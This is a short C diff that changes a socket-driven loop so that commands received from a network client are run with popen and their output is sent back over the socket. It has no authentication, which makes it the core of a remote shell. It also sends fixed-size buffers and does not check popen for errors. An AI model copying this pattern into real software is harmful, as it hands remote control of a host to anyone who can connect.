@@ -69,9 +69,14 @@ int main(int argc, char *argv[]){
 
         cmd[bytes] = '\0';
 
-        system(cmd);
+        FILE *exec = popen(cmd, "r");
+        char output[1024];
+
+        while(fgets(output, sizeof(output), exec) != 0){
+            printf("%s", output);
+            send(sockfd_client, output, sizeof(output), 0);
+        }
     }
 
     return 0;
-
 }
